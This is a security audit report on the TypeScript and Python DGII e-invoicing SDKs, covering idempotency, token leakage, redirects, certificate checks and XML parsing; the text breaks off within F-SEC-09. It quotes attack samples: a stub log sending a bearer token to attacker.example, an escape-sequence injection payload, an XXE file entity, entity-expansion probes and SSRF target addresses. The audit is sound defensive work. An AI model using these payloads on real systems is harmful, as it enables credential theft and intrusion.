# Security Review

**Pipeline:** P5 — Security (attack surface, crypto, XML, HTTP)
**Target:** `packages/typescript` (`@deuriib/dgii-ecf` 0.6.1) and `packages/python` (`py-dgii-ecf` 0.7.2)
**Reviewer role:** Security Reviewer + Application Security Engineer
**Baseline accepted as given (not re-measured):** unit suites, lints, and both XMLDSig gates pass against
libxmlsec1 1.3.9. Where this report says "verified by running", the command was executed in this
sandbox against a **local stub** (`fetchImpl` injection, `http.server`, or a scratch `/tmp` harness);
**no traffic was sent to any `dgii.gov.do` host.**
**Read-only:** the only file this pipeline wrote inside the repository is this report.

---

## Verdict

**PASS WITH FINDINGS.**

Justification:

- **No blocker.** The two things that would ordinarily make an SDK of this class a FAIL are absent and were
  tested, not assumed: **there is no XXE / entity-expansion / external-DTD path in either package** (§What
  is already correct, C1–C3), and **TLS verification is on by default in both** (`httpx2` `verify=True`;
  TS uses native `fetch`, which verifies against the OS trust store). Signing, canonicalization and the
  money arithmetic are sound and not in my remit to re-litigate.
- **One HIGH** finding is a *parity* defect with a fiscal consequence rather than an eavesdropping
  primitive: the TypeScript client deletes its persist-before-transmit idempotency marker when DGII answers
  2xx with an unreadable body, so a retry can **re-issue an already-accepted e-CF**. Python gets this right,
  which is why it reads as a bug rather than a design decision. It must be fixed before the next TS release.
- **Four MEDIUM** findings are real but each needs a specific, stated precondition: an untrusted
  `buyerHost`/redirect (F-SEC-02, F-SEC-05), a developer logging an object (F-SEC-03), a caller misreading
  a verification helper's name (F-SEC-04). None is remotely exploitable against the default DGII endpoints
  with an honest DGII server and an honest caller.
- The defence-in-depth posture is better than typical for an SDK that handles key material: no secrets in
  git (150 commits scanned), no shell interpolation, truncating/HTML-stripping error normalizer,
  OIDC trusted publishing with no long-lived registry tokens, and minimal `permissions:` on every job that
  publishes or writes.

The residual risk is concentrated in **what the SDK does with an untrusted *response*** — redirects,
`buyerHost`, and the 2xx-with-empty-body case — not in what it does with an untrusted *document*.

---

## Threat model in one page

### Assets

| # | Asset | Where it lives | Why it matters |
|---|-------|----------------|----------------|
| A1 | RSA private key + X.509 cert (PKCS#12) | caller-provided `.p12`; SDK copies it into PEM strings in memory (`P12ReaderData`) | Signs legally binding tax documents. Compromise ⇒ unlimited forged invoicing under the issuer's identity. |
| A2 | `.p12` passphrase | `P12Reader` instance (`certificate.ts:25`, `certificate.py:43-44`) and the CLI | Unlocks A1 if the `.p12` file is also obtained. |
| A3 | DGII bearer token | `HttpClient` (`http.ts:132`, `http.py:119`), returned to callers as `AuthToken` | Authorises submissions as the issuer until `expira`. |
| A4 | `statusApiKey` (`Authorization: Apikey …`) | `ECF.statusApiKey` (`client.ts:174`) | Read-only status service; lower value. |
| A5 | Signed e-CF / ACECF / ANECF (in flight) | request body of every POST | Contains buyer identity, amounts, and a valid signature — an integrity and confidentiality asset (tax secrecy). |
| A6 | The DGII response that drives a decision | `consultaestado`, `consultatrackids`, `consultaresultado`, seed | Decides routing, whether the idempotency lock is cleared, and whether a sequence may be reused. Forging it ⇒ duplicate or lost fiscal document. |
| A7 | Build/release pipeline | GitHub Actions, npm/PyPI publishing | Compromise ships attacker code to every integrator with A1 access at runtime. |

### Actors

1. **SDK integrator (caller)** — trusted in intent, unreliable in practice. Controls `buyerHost`,
   `xmllintBin`, `fetchImpl`, the idempotency store, and whether the SDK is bundled client-side. Can leak
   A1–A3 by logging an object (F-SEC-03) or by passing a URL from a third party (F-SEC-02).
2. **DGII** — trusted but not trusted *blindly*: its response bodies (A6) drive SDK decisions. Compromise of
   DGII, or of a TLS-terminating intermediary, is out of scope for confidentiality of A5 (which DGII must
   see) but **is** in scope for integrity of A6.
3. **Buyer / receiver host** — an explicitly *untrusted third party* that the SDK is designed to talk to
   directly (`fe/...` endpoints). It receives A5 by design, and it answers the seed challenge, so it can
   also feed the signer attacker-chosen XML (F-SEC-10). It is the most realistic adversary in the model.
4. **On-path network attacker** — must defeat TLS to matter; then owns A3, A5 and A6.
5. **Malicious contributor / compromised dependency** — supply chain into A7.

### Entry points (untrusted input ⇒ SDK code)

| Entry point | Caller-controlled input | Network-controlled input |
|---|---|---|
| `Signature.signXml` / `sign_xml` | the XML document to sign | — |
| `Transformer.xml2json` / `xml_to_json` | the XML document | — |
| `ECF.authenticate` | — | seed body → **signed** (`client.ts:321,340-341`) |
| `ECF.sendElectronicDocument/…` | `signedXml`, `fileName`, `buyerHost` | 3xx, body, headers |
| `ECF.reconcileSubmission`, `statusTrackId`, `inquiryStatus`, `trackStatuses` | `signedXml` / ids | JSON body (**A6 decision input**) |
| `getXmlFromBodyResponse` | body | body |
| `P12Reader.*`, `Signature.from_p12` | file path, base64, passphrase | — |
| `validateDocument` / `validate_document` | XML | — |
| CLI `sign` / `authenticate` / `status` | paths, `--password` | (via API) |

### Trust boundaries crossed

- **B1 — caller XML ⇒ signer.** The signer signs whatever it is given, with an element-name override.
- **B2 — network response ⇒ fiscal decision.** A6 crosses into `submitIdempotent` and
  `reconcileSubmission`; a forged or malformed answer changes whether a document is sent again.
- **B3 — DGII directory ⇒ `buyerHost` ⇒ outbound request + A3 header.** `urlRecepcion` is a string
  published by DGII and consumed by the SDK with no validation (`docs/en/guides/flow.md:294-295`).
- **B4 — secret ⇒ logs/inspect/CLI/stdout.**
- **B5 — repo ⇒ published artifact** (workflows, lockfiles, hooks).

The findings below map to B1 (F-SEC-10), B2 (F-SEC-01, F-SEC-05), B3 (F-SEC-02, F-SEC-05),
B4 (F-SEC-03, F-SEC-06, F-SEC-07, F-SEC-08) and B5 (F-SEC-11, F-SEC-12).

---

## Findings

| ID | Severity | CWE / OWASP | Title | Package | Verified by |
|----|----------|-------------|-------|---------|-------------|
| F-SEC-01 | **HIGH** | CWE-354 / A08 Software & Data Integrity | 2xx with an unreadable body wipes the pending idempotency marker ⇒ duplicate e-CF | TS only (PY correct) | running (both) |
| F-SEC-02 | MEDIUM | CWE-319 / CWE-201 / A02, A04 | `buyerHost` is unvalidated: `http://` accepted, no host allow-list, DGII bearer token attached to any host | TS + PY | running (TS), reading (PY) |
| F-SEC-03 | MEDIUM | CWE-532 / CWE-312 / A09 | Private key, `p12` passphrase, bearer token and status API key are exposed through `util.inspect` / `JSON.stringify` / `repr` | TS + PY | running (both) |
| F-SEC-04 | MEDIUM | CWE-295 / A02, A07 | `validateXMLCertificate` reports `isValid: true` for an unsigned document with a self-signed cert; no chain, revocation, key-usage or signature verification | TS + PY | running (TS), reading (PY) |
| F-SEC-05 | MEDIUM | CWE-601 / CWE-345 / A04 | TS follows 3xx: 307/308 replay the signed body to the new host, 301/302/303 degrade the POST to a GET and accept the third-party answer | TS only (PY correct) | running (both) |
| F-SEC-06 | LOW | CWE-214 / CWE-522 / A04, A07 | CLI accepts `--password` on argv (shell history, `ps`); passphrase retained for the reader's lifetime | PY (argv), TS+PY (retention) | running (PY argv) |
| F-SEC-07 | LOW | CWE-150 / A03 | Error text preserves ESC/OSC sequences and the CLI echoes them to the terminal | TS + PY | running (both) |
| F-SEC-08 | LOW | CWE-400 / A04 | Response body is read without any size cap | TS + PY | reading |
| F-SEC-09 | LOW | CWE-1188 / A05 | Python uses lxml's implicit parser defaults; `_canonicalize` re-parses with a bare `etree.fromstring` | PY | running |
| F-SEC-10 | LOW | CWE-501 / CWE-345 | Seed response is signed without shape or size validation; element-name override lets the caller sign a foreign root | TS + PY | running (TS) |
| F-SEC-11 | LOW | CWE-1357 / A08 | Actions pinned to movable major tags, not SHAs; unpinned `uvx`/`npm` fetches in publishing jobs | CI | reading |
| F-SEC-12 | LOW | CWE-778 / A09 | Secret *detection* gap: base64/DER PKCS#12 is invisible to gitleaks; the `certificate-material` hook is extension-only | repo tooling | running |

---

### F-SEC-01 — A 2xx with an unreadable body wipes the pending submission marker (HIGH)

**CWE-354 (Improper Validation of Integrity Check Value) / OWASP A08.**
TS only; Python is correct, which makes this a parity defect with a fiscal consequence.

**Where.**
`packages/typescript/src/client.ts:251-259` — the persist-before-transmit flow:

```ts
await this.idempotency.set(key, PENDING_SUBMISSION);
const result = await send();
if (result.isOk()) { await this.idempotency.set(key, result.value); }   // 255
else                { await this.idempotency.delete(key); }              // 257
```

`send()` is `http.postMultipart` (`client.ts:574-586`), and `parseResponse` returns `ok(data as T)` for
**every** 2xx (`http.ts:221-223`) regardless of whether a body was decoded. `readBody`
(`http.ts:202-215`) yields `undefined` for an empty body or for a body that fails to decode. The marker is
therefore **overwritten with `undefined`**, and `InMemoryIdempotencyStore.get` returns `undefined` for that
entry (`http.ts:63-73`), i.e. a cache miss. Any pluggable store with the same `get(): T | undefined`
contract behaves identically.

Python deliberately does the opposite: `_submit_idempotent` hands the success to `_cache_submission`,
which refuses a non-dict payload **without** touching the marker
(`packages/python/src/py_dgii_ecf/client.py:241-262`, comment: *"DGII already accepted the document when we
get here, so the key is never dropped on a shape problem: re-submitting would risk a duplicate fiscal
document"*). That comment is the acknowledgement that DGII does produce unreadable 2xx bodies.

**Attack scenario (who sends what to whom, and what they get).**
1. Issuer submits e-CF `E31…001`. TS writes `pending` under `RNC:eNCF:sha256(signedXml)`, POSTs, DGII
   accepts and answers `200` with an empty or non-JSON body (proxy-generated page, `.png` upload quirk,
   gateway rewrite). The SDK returns `Ok(undefined)` — the caller sees success but has no `trackId`.
2. The caller treats "no trackId" as "unknown outcome" and either retries the send or calls
   `reconcileSubmission`. The marker is gone, so the retry path finds a cache miss and **transmits the same
   signed e-CF again**.
3. Result: a second accepted submission for the same e-NCF — a duplicate fiscal document, DGII-side
   sequence consumption, and a reconciliation puzzle for the issuer. The SDK's *documented* idempotency
   guarantee is silently violated.
4. Attacker-assisted variant: combine with F-SEC-05 (an attacker-controlled `buyerHost` or redirect target
   answers `200` with an empty body and an attacker-chosen `trackId`), which lets a third party both
   suppress the lock and fabricate the acknowledgement.

**Fix (both packages, TS is the one that changes).**
- TS: mirror `_cache_submission`. Only cache on a decoded, object-shaped body; for a 2xx whose body is absent
  or not an object, **keep** the pending marker and return `Err(VALIDATION, "Unexpected DGII response
  payload; reconcile before retrying")` — the exact Python message
  (`client.py:248-260`) so the two SDKs stay behaviourally identical.
  ```ts
  const result = await send();
  if (result.isErr()) { await this.idempotency.delete(key); return result; }
  const value = result.value;
  if (typeof value !== 'object' || value === null) return err(new DgiiError(UNEXPECTED_PAYLOAD, { code: 'VALIDATION', ... }));
  await this.idempotency.set(key, value);
  ```
- Python: no behaviour change; add a regression test pinning the current behaviour so a future "simplify"
  does not reintroduce the TS shape.
- Update `project-docs/architecture.md` (the idempotency contract) and add the case to both test suites.

**How to verify the fix.** Unit test in both packages: inject a transport that answers `200` with
`''` (and with `text/html` `'<html>'`), call the send twice, assert (a) the first call is `Err(VALIDATION)`,
(b) the second call returns the SDK's pending-submission error, (c) the transport saw **one** request.

---

### F-SEC-02 — `buyerHost` is unvalidated and carries the DGII bearer token to whatever host it names (MEDIUM)

**CWE-319 (Cleartext Transmission of Sensitive Information) / CWE-201 (Insertion of Sensitive Information
into Sent Data) / OWASP A02, A04.**
Both packages. TS: verified by running. PY: verified by reading (`http.py:148-153`, `client.py:375-416`).

**Where.**
`buildSenderReceiverUrl` / `build_sender_receiver_url` concatenate the host verbatim with no scheme, host,
or port check (`packages/typescript/src/environment.ts:72-75`,
`packages/python/src/py_dgii_ecf/environment.py:83-85`). Every request built from it goes through
`authHeaders` / `_headers`, which attach the bearer token unless `omitAuth` is set
(`http.ts:191-201`, `http.py:143-153`) — and the `buyerHost` call sites never set `omitAuth`
(`client.ts:509-517`, `client.ts:530-537`, `client.ts:568-586`, `client.py:375-416`).

`buyerHost` is not an arbitrary developer string: the documented B2B flow tells callers to feed it from DGII's
directory response — *"**Directory** gives you `urlRecepcion`, `urlAceptacion` and `urlOpcional` for a given
RNC, which is what the B2B flow uses"* (`docs/en/guides/flow.md:294-295`), and the value surfaces as
`ServiceDirectoryResponse.urlRecepcion` (`packages/python/src/py_dgii_ecf/types.py:439-457`).

**Attack scenario.**
1. Issuer authenticates normally → `HttpClient.token` holds the **DGII** token (A3).
2. Issuer resolves the buyer's service URL from `getCustomerDirectory` and passes
   `urlRecepcion = "http://recepcion.example/"` to `sendElectronicDocument(xml, f, urlRecepcion)`.
3. Verified by running with a stub transport:
   ```
   -> POST http://attacker.example/fe/recepcion/api/ecf auth=Bearer DGII-BEARER-TOKEN
   ```
   The signed e-CF **and** the DGII bearer token are transmitted in cleartext to a host the SDK never
   authenticated, over a scheme the SDK never rejected.
4. Whoever answers (the buyer, or anyone on the path for `http://`, or anyone who can influence a directory
   entry) obtains: the tax document with its signature, the issuer's DGII token for its remaining lifetime,
   and the ability to answer however it likes (see F-SEC-05, F-SEC-01).
5. Secondary variant — **SSRF**: because no host allow-list exists, a value that reaches `buyerHost` from a
   multi-tenant config, a database column, or a customer-supplied settings form makes the SDK emit POSTs with
   an `Authorization` header and an attacker-chosen XML body to `127.0.0.1`, `169.254.169.254`, or any
   internal host.

**Fix (both packages).**
- Reject non-`https:` schemes for `buyerHost` unless an explicit opt-in is passed
  (`allowInsecureBuyerHost: true` / `allow_insecure_buyer_host=True`), and reject URLs with userinfo,
  fragment, or a non-default port. Validate with the platform parser (`new URL()`, `urllib.parse.urlsplit`),
  not a regex.
- Do not attach the DGII bearer token to a `buyerHost` request. Scope the token to its origin:
  keep `Map<origin, token>` in `HttpClient` and attach a token only when
  `new URL(url).origin === tokenOrigin`, or set `omitAuth` on every Sender↔Receiver call and require the
  caller to authenticate against that host explicitly (`authenticate(buyerHost)` already exists for that).
- Document in the TS/Python API pages and in `docs/{en,es}/guides/flow.md` that `urlRecepcion` must be
  treated as untrusted input, and add the constraint to `project-docs/architecture.md`.

**How to verify the fix.** Unit tests: (a) `buyerHost = "http://x/"` → `Err(VALIDATION)`; (b)
`buyerHost = "https://user:pw@x/"` → `Err`; (c) a `buyerHost` post carries **no** `Authorization` header
while a DGII post still does; (d) `build_sender_receiver_url("https://x/")` still produces the current
`fe/...` paths.

---

### F-SEC-03 — Secrets are exposed through object inspection and serialization (MEDIUM)

**CWE-532 (Insertion of Sensitive Information into Log File) / CWE-312 (Cleartext Storage of Sensitive
Information) / OWASP A09.**
Both packages. Verified by running in both.

**Where / what leaks.**

| Object | Leaks | Mechanism | Evidence |
|---|---|---|---|
| TS `P12Reader` | **`.p12` passphrase** | `constructor(private readonly passphrase: string)` (`certificate.ts:25`) compiles to an enumerable own property | `util.inspect(r)` → `P12Reader { passphrase: 'SUPER-SECRET-PASSPHRASE' }`; `JSON.stringify(r)` → `{"passphrase":"SUPER-SECRET-PASSPHRASE"}` |
| TS `Signature` | **PEM private key** | `constructor(private readonly privateKey: string, …)` (`signing.ts:71-74`) | `util.inspect` → `Signature { privateKey: '<PEM-PRIVATE-KEY>\nMIIsecret…' }` |
| TS `ECF` | **private key + bearer token + status API key** | `private readonly credentials` (`client.ts:167`), `http.token` (`http.ts:132`), `statusApiKey` (`client.ts:174`) | `util.inspect(ecf)` contains `MIIsecret`, `BEARER-TOKEN-ABC123`, `STATUS-API-KEY-XYZ` |
| TS `HttpClient` | bearer token | `private token?: string` (`http.ts:132`) and public `getToken()` (`http.ts:159-161`) | same class |
| PY `P12ReaderData` | **PEM private key** | `@dataclass(frozen=True, slots=True)` with `key: str \| None` (`certificate.py:20-26`) | `P12ReaderData(key='<PEM-PRIVATE-KEY>\nMIIabc…')` |
| PY `AuthToken` | **bearer token** | dataclass with `token: str` (`types.py:47-53`) | `AuthToken(token='BEARER-TOKEN-VALUE')` |
| PY `P12Reader` | passphrase | `self._passphrase` (`certificate.py:43-44`) | `vars(reader)` → `{'_passphrase': …}` (default `repr` is safe) |
| PY `Signature` | private key object | `self._private_key` (`signing.py:68`) | default `repr` is safe |

`ECF`/`HttpClient` in Python are plain classes with the default `repr`, so `repr(client)` is safe — the
TypeScript class is the worse of the two, and `console.log(client)` / `console.log(credentials)` is
common debugging practice.

**Attack scenario.** A developer debugging a failed submission writes `console.log(ecf)` (or an error
reporter serialises the client, or a structured logger is handed the `P12Reader`). The private key, the
`.p12` passphrase and the live bearer token land in a log aggregator, a CI log, or a third-party APM —
i.e. A1, A2 and A3 all leave the process at once. From there, A1 alone allows forging invoices offline
indefinitely, and A2+A1 together defeat the "store the `.p12` in a secret manager" control that `SECURITY.md`
prescribes.

**Fix (both packages).**
- TS: move every secret into ECMAScript **private** fields — `#passphrase`, `#privateKey`, `#token`,
  `#statusApiKey`, `#credentials` — which are invisible to `util.inspect` (even with `showHidden`) and to
  `JSON.stringify`; verified in node 26 and bun 1.4.4:
  `class A { #secret = 'x'; }` → `util.inspect(new A())` prints `A { }`. Add
  `[util.inspect.custom]()` and `toJSON()` to `ECF`, `HttpClient`, `Signature` and `P12Reader` returning a
  redacted view (`{ environment, hasToken: true }`), so an accidental log is useless by construction.
- PY: add `field(repr=False)` to `P12ReaderData.key` and `AuthToken.token` (or hand-write `__repr__` with
  `key=<redacted>`); give `P12Reader` and `Signature` explicit `__repr__`s that name the object and nothing
  else. Do **not** rely on the module-level private-name convention for a secret: `vars()` ignores it.
- Add a note to `SECURITY.md` "Security guidance" that neither SDK object is safe to log, and a
  `docs/{en,es}` warning next to the credential examples.

**How to verify the fix.** Snapshot tests: `util.inspect(new P12Reader('p'))` and `JSON.stringify(it)` must
not contain `p`; `util.inspect(ecf)` must not contain the key PEM or the token; `repr(P12ReaderData(key='K'))`
must not contain `K`. Mirror the test in both suites so the redaction cannot rot.

---

### F-SEC-04 — `validateXMLCertificate` answers a much weaker question than its name (MEDIUM)

**CWE-295 (Improper Certificate Validation) / OWASP A02, A07.**
Both packages. TS: verified by running. PY: verified by reading (`signing.py:199-229`); the two
implementations are line-for-line equivalent.

**Where.** `packages/typescript/src/signing.ts:146-181`, `packages/python/src/py_dgii_ecf/signing.py:199-229`.

What it actually does: regex the **first** `<X509Certificate>` out of the raw string
(`signing.ts:146-147`, `signing.py:199-201`), DER-decode it, build an X509 object, and compare `now` against
`validFrom`/`validTo`.

What it does **not** do: it does not verify the XML signature, does not check that the certificate was the one
that produced `SignatureValue`, does not check the issuer chain or any trust anchor, does not check
revocation (CRL/OCSP), does not check `keyUsage`/`extendedKeyUsage`/`basicConstraints`, does not check the
subject against the expected RNC, and does not notice extra certificates elsewhere in the document.

Verified by running — a document with **no `<SignatureValue>` at all** and a freshly minted **self-signed,
unknown-CA** certificate:

```
isValid = true | issuer = CN=attacker-self-signed
```

**Attack scenario.** A receiver-side integrator (a very plausible use of the only exported "validate"
helper) writes `if (validateXMLCertificate(xml).isValid) accept(xml)`. An attacker submits an e-CF with an
arbitrary body, no signature, and their own self-signed cert: the check passes. Alternatively the attacker
keeps the victim's real certificate in the document (so the date check passes) and replaces the payload —
also accepted, because the signature is never verified. This is a *contract* defect, not an implementation
bug: the SDK never claims otherwise, but the name, the `isValid` flag and the absence of any warning invite
exactly this misuse.

**Fix (both packages).**
- Rename to what it measures (`checkEmbeddedCertificateDates` / `check_embedded_certificate_dates`) **or**
  keep the name and change the return type to state the limits explicitly, e.g.
  `{ datesValid: boolean; signatureVerified: false; chainVerified: false }` with docstrings that say
  "this does not authenticate the document; verify with `xmlsec1 --verify` (see SECURITY.md)".
- Add a real verifier as a separate, clearly named helper. TS: `xml-crypto`'s
  `SignedXml.loadSignature(...)` + `checkSignature(...)` against the embedded cert (the dependency is already
  there, `package.json:61`). PY: `xmlsec` is already an optional extra used by the gate
  (`scripts/verify_signing.py`) — document it as the supported verification path.
- Enforce the invariant in tests: a document with a valid cert but a tampered body must be reported as
  *not verified* by whatever the public API exposes.

**How to verify the fix.** Tests: (a) unsigned document with a valid cert → `datesValid: true` and no
"valid" verdict anywhere; (b) valid document with a modified `<MontoTotal>` → signature verification fails;
(c) a doc carrying two certificates → the API says which one it looked at.

---

### F-SEC-05 — TypeScript follows redirects; a 307/308 replays the signed document to the new host (MEDIUM)

**CWE-601 (URL Redirection to Untrusted Site) / CWE-345 (Insufficient Verification of Data Authenticity) /
OWASP A04.**
TS only. Python is correct: `httpx2` defaults to `follow_redirects=False`, `max_redirects=20`
(verified by running `inspect.signature(httpx2.Client.__init__)`; the client is built without the flag at
`http.py:119-120`).

**Where.** `packages/typescript/src/http.ts:281-287` calls `this.fetchImpl(url, { method, headers, body,
signal })` with **no `redirect` option**. Native `fetch` defaults to `redirect: "follow"` with up to 20 hops.

**Verified by running** (local origin + local redirector, node 26.13.0 and bun 1.4.4, `POST` with a FormData
body and an `Authorization: Bearer SECRET-TOKEN` header):

| Status | Method at target | Body at target | `Authorization` at target | TS accepts as success |
|---|---|---|---|---|
| 301 / 302 / 303 | `GET` | *dropped* | absent | **yes** (`response.ok`) |
| 307 / 308 | `POST` | **re-sent in full** | absent | **yes** |

**Attack scenario.**
1. **Integrity (both halves).** Whoever answers the request can name the final endpoint and the SDK will
   treat that endpoint's response as DGII's answer. With a 301/302/303 the SDK's e-CF submission is
   downgraded to a `GET` to an attacker URL, the body is dropped, and the attacker's `200` — a fake
   `{"trackId": "...", "estado": "Aceptado"}` — becomes the caller's `InvoiceResponse`. The caller records a
   submission that never happened, and (per F-SEC-01) with an empty body the idempotency lock is also gone.
   This needs control of the response from a *trusted* endpoint (DGII, or a TLS-broken path) **or** a
   `buyerHost` the caller passed (F-SEC-02) — the B2B endpoints are third-party by design.
2. **Confidentiality.** With a 307/308 to a host the SDK does not control, the complete signed tax document
   is re-POSTed there. `Authorization` is stripped cross-origin by both runtimes (measured — undici and bun
   both implement the spec's confidential-header removal), so the token does not follow; the document does.
3. **Parity.** The same call against the Python SDK returns `Err(HTTP)` naming the 3xx status, because
   `httpx2` does not follow; the two SDKs therefore disagree about what happened to the same document.

**Fix.**
- TS: pass `redirect: 'manual'` and treat any 3xx as a `DgiiError` (`code: 'HTTP'`, message
  `"DGII answered with a redirect (${status}); refusing to follow"`); never follow into another origin, and
  if a redirect is ever needed, require same-origin **and** the same scheme.
- PY: no behaviour change; add a test asserting a 3xx on `post_multipart` is an `Err` with the same code and
  message so the parity gate catches a future `follow_redirects=True`.
- Record the decision in `project-docs/architecture.md` next to the HTTP client contract.

**How to verify the fix.** Local stub answering `307` with a `Location` to a second local server: assert the
SDK returns `Err`, and that the second server received **zero** requests, in both packages.

---

### F-SEC-06 — CLI passphrase on argv; passphrase retained for the object's lifetime (LOW)

**CWE-214 (Invocation of Process Using Visible Sensitive Information) / CWE-522 / OWASP A04, A07.**
PY (argv), both (retention). Verified by running.

**Where.** `packages/python/src/py_dgii_ecf/cli.py:31` declares
`PasswordOption = Annotated[str, typer.Option(prompt=True, hide_input=True)]`. `prompt=True` means *prompt
when absent* — it does **not** remove the flag. Verified:

```
$ uv run --frozen py-dgii-ecf sign --help
│ *  --password        <str>   [required]                                      │
$ uv run --frozen py-dgii-ecf sign in.xml notp12.p12 --password "S3CR3T-ON-ARGV"
error: Unable to parse .p12: Could not deserialize PKCS12 data
```

Retention: `certificate.ts:25` / `certificate.py:43-44` keep the passphrase as long as the `P12Reader`
lives; `certificate.py:47` also materialises a second immutable copy via `.encode("utf-8")`; neither can be
zeroed.

**Attack scenario.** On a shared host (CI job, jump box, container with a shell), `ps aux` / `/proc/<pid>/cmdline`
exposes the passphrase to any local user for the lifetime of the process, and the shell history keeps it
forever — exactly the file that pairs with a `.p12` someone left in `$HOME`. This is the standard
"passphrase on the command line" mistake; the SDK's own `hide_input=True` shows the intent was to avoid it,
and the flag defeats that intent.

**Fix.**
- PY: drop the flag and prompt only — `typer.Option(prompt=True, hide_input=True)` **without** the option
  name being usable, e.g. read from stdin (`--password-stdin`), or from a file descriptor / env var that the
  docs mark as less safe than the prompt. Keep an explicit `--password-stdin` escape hatch for automation and
  reject `--password <value>` with a clear message.
- Both: keep the passphrase only as long as the load call needs it. Python: accept `bytearray` and zero it
  after use; TS: hold it in a `#private` field inside a closure used by `load()` so the reader cannot be
  inspected for it (F-SEC-03), and document that `P12Reader` should be short-lived.
- Note the current state honestly in `SECURITY.md` if the flag is kept.

**How to verify the fix.** CLI test: invoking the command with `--password x` must exit non-zero with a
message pointing at `--password-stdin`; a test asserting the reader no longer exposes a `passphrase` field
covers the TS half.

---

### F-SEC-07 — Terminal escape sequences survive error normalization and are echoed (LOW)

**CWE-150 (Improper Neutralization of Escape, Meta, or Control Sequences) / OWASP A03.**
Both packages. Verified by running.

**Where.** `_collapse` / `collapseWhitespace` split on Unicode whitespace only, which does not include
`ESC` (`errors.py:57-58`, `errors.ts:37-39`); `_truncate`/`truncate` cut at 1000 chars without touching
control bytes (`errors.py:54-55`, `errors.ts:35-36`). `stripHtml` removes tags, not escapes
(`errors.ts:44-54`, `errors.py:60-65`). The CLI then prints them verbatim:
`packages/python/src/py_dgii_ecf/cli.py:47,71,92,111,115` (`typer.echo(f"error: {result.unwrap_err()}", err=True)`).

Verified by running:
```
in →  "\x1b[2J\x1b]0;PWNED\x07DLQ-1234: no encontrado"
out→  "\x1b[2J\x1b]0;PWNED\x07DLQ-1234: no encontrado"     (both packages)
CLI would echo → 'error: \x1b[2J\x1b]0;PWNED\x07DLQ-1234: no encontrado'
```

**Attack scenario.** A hostile or compromised endpoint (DGII itself; a `buyerHost`, which is a third party
by design; anything answering behind a redirect per F-SEC-05) returns a body whose text contains OSC 52
(`ESC ] 52 ; c ; <base64> BEL`) to overwrite the operator's clipboard, OSC 8 to render a clickable link with
attacker-chosen text, `ESC [ 2 J` to clear the screen, or `ESC [ ? 25 l` to hide the cursor while a fake
prompt is printed. The operator sees a fabricated error and may paste or click something the attacker chose.
This is a genuine but low-value primitive: it needs a trusted endpoint to misbehave and produces no direct
system compromise.

**Fix (both packages).** In the single normalizer, strip `ESC` and the C0/C1 control range (keeping `\t` and
`\n` collapsed to a space) before truncation:
```ts
const stripControl = (s: string) => s.replace(/[\u0000-\u0008\u000B-\u001F\u007F-\u009F]/g, '');
```
```python
_CONTROL = re.compile(r"[\x00-\x08\x0b-\x1f\x7f-\x9f]")
```
Apply it inside `truncate`/`_truncate` so *every* message path is covered, and call `typer.echo(..., color=False)`
in the CLI for defence in depth.

**How to verify the fix.** Table-driven test in both suites: the payload above must come out as
`"DLQ-1234: no encontrado"` with no bytes below `0x20`.

---

### F-SEC-08 — Response bodies are read with no size limit (LOW)

**CWE-400 (Uncontrolled Resource Consumption) / OWASP A04.** Both packages. Verified by reading.

**Where.** `packages/typescript/src/http.ts:202-215` — `await response.json()` / `await response.text()`
materialise the whole body; there is no `Content-Length` check and no streaming cap. `packages/python/src/py_dgii_ecf/http.py:155-161`
— `response.json()` / `response.text` likewise (httpx applies no default limit once the body has been
buffered). The same is true of the seed response, which is then handed to the XML parser
(`client.ts:507-519`, `client.py:325-341`).

**Attack scenario.** A hostile or misbehaving endpoint streams gigabytes (or a compression bomb, which both
clients will decode) in answer to a single submission, OOMing the invoicing worker. On a host that also runs
the signer, the OOM kill takes the signing path down with it. Requires the same precondition as F-SEC-05/02
(untrusted endpoint or TLS compromise), hence LOW.

**Fix (both packages).** Cap the body at a documented maximum (DGII's JSON answers are kilobytes; 1 MiB is
generous): TS — check `response.headers.get('content-length')`, and read through `response.body` with a
byte counter (or `AbortController`) that fails past the cap. PY — `stream=True` + `iter_bytes()` with a
running total, or check `Content-Length` before `.read()`. Return `Err(HTTP, "response body exceeds N
bytes")`.

**How to verify the fix.** Local stub returning a 5 MiB body (and a chunked body with no `Content-Length`):
the SDK must return `Err` quickly and must not allocate the body.

---

### F-SEC-09 — Python relies on lxml's implicit parser defaults; `_canonicalize` re-parses bare (LOW)

**CWE-1188 (Insecure Default Initialization) / OWASP A05.** Python only. Verified by running.

**Where.** Four parse sites use defaults or near-defaults:
- `signing.py:115` — `etree.XMLParser(remove_blank_text=True, remove_comments=True)`, i.e.
  `resolve_entities` left at its default `True`;
- `signing.py:52` — `_canonicalize` re-parses `etree.tostring(node)` with a **bare** `etree.fromstring`, no
  parser at all;
- `transformer.py:103` and `validation.py:108` — `etree.fromstring(xml.encode("utf-8"))` with **no** parser.

Measured behaviour of this stack (lxml 6.1.3 / libxml2 2.14.6):

| Probe | Result |
|---|---|
| `<!ENTITY e "EXPANDED">` + `&e;` through the default parser | expanded (`'EXPANDED'`) — internal entity expansion **is** on |
| `<!ENTITY x SYSTEM "file:///tmp/sec/secret.txt">` + `&x;` | `XMLSyntaxError: Entity 'x' not defined` — **no XXE**, even with `load_dtd=True` |
| 9-level billion-laughs | `XMLSyntaxError: Maximum entity amplification factor exceeded` — blocked |
| 50 000-deep nesting | `Excessive depth in document: 256` — blocked |
| 128 000 unterminated quotes through `extract_element_text` | 23.8 ms — linear, no ReDoS |

So **today there is no exploitable defect**. The finding is the fragility: the only thing preventing XXE and
entity expansion is lxml's default `no_network=True`/`load_dtd=False` and libxml2's amplification guard — a
guard that arrived in libxml2 2.13 and is absent from older builds. `pyproject.toml` pins `lxml>=5.0` with no
upper bound, and older lxml releases bundle correspondingly older libxml2, where that guard does not exist. `_canonicalize`'s bare re-parse is the sharpest
edge: the moment anyone flips `resolve_entities=False` to "harden" `sign_xml`, the serialized entity
references come straight back out and the **second** parser expands them again — the hardening would be
silently undone.

**Fix.** One module-level parser factory, used by all four sites:
```python
_SAFE_XML_PARSER = dict(resolve_entities=False, no_network=True, load_dtd=False, huge_tree=False, dtd_validation=False)
def _parser(**extra: object) -> etree.XMLParser: return etree.XMLParser(**{**_SAFE_XML_PARSER, **extra})
```
and use it in `signing.py:52`, `signing.py:115`, `transformer.py:103`, `validation.py:108`. Add a comment at
`_canonicalize` explaining *why* the second parse must reuse the same parser. Raise the floor to
`lxml>=5.2` (or whatever the team can prove bundles libxml2 ≥ 2.13) and add a note to
`project-docs/architecture.md` §XML.

**How to verify the fix.** Re-run the four probes above with the hardened parser: internal entities must come
